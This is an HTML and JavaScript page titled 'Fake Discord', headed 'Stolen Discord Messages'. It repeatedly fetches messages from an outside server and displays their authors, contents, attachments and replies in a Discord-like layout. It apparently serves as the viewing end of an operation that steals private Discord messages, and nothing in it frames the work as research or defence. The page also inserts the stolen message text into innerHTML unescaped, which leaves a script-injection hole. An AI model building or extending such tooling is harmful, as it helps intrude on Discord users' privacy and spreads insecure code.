<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fake Discord</title>
  <style>
    body {
      font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-color: #36393f;
      color: #dcddde;
      margin: 0;
      padding: 0;
    }
    .chat-container {
      width: 800px;
      margin: 0 auto;
      background-color: #2f3136;
      border-radius: 5px;
      padding: 20px;
    }
    .message {
      background-color: #202225;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
    }
    .author {
      font-weight: bold;
      color: #fff;
    }
    .timestamp {
      font-size: 12px;
      color: #72767d;
    }
    .embed {
      border-left: 2px solid #2f3136;
      padding-left: 10px;
      margin-top: 5px;
      color: #aaa;
    }
    .attachment {
      color: #00aff4;
      word-break: break-all;
    }
  </style>
</head>
<body>
  <div class="chat-container">
    <h1>Stolen Discord Messages</h1>
    <div id="messages"></div>
  </div>

  <script>
    async function fetchMessages() {
      const response = await fetch('https://view-server.onrender.com/api/messages');
      const messages = await response.json();
      const messagesDiv = document.getElementById('messages');
      messagesDiv.innerHTML = messages.map(msg => `
        <div class="message">
          <span class="author">${msg.author}</span>
          <span class="timestamp">(${new Date(msg.timestamp).toLocaleTimeString()})</span>
          <p>${msg.content}</p>
          ${msg.embeds && msg.embeds.length > 0 ? `
            <div class="embed">
              <strong>Embeds:</strong>
              ${msg.embeds.map(embed => `
                <div>
                  <strong>${embed.title || 'No title'}</strong>
                  <p>${embed.description || 'No description'}</p>
                </div>
              `).join('')}
            </div>
          ` : ''}
          ${msg.attachments && msg.attachments.length > 0 ? `
            <div class="attachment">
              <strong>Attachments:</strong>
              ${msg.attachments.map(attachment => `
                <div><a href="${attachment}" target="_blank">${attachment}</a></div>
              `).join('')}
            </div>
          ` : ''}
          ${msg.reference ? `
            <div class="embed">
              <strong>Replied to:</strong>
              <p>Message ID: ${msg.reference.messageId}</p>
            </div>
          ` : ''}
        </div>
      `).join('');
    }

    setInterval(fetchMessages, 5000); // Refresh every 5 seconds, you impatient fuck
    fetchMessages();
  </script>
</body>
</html>
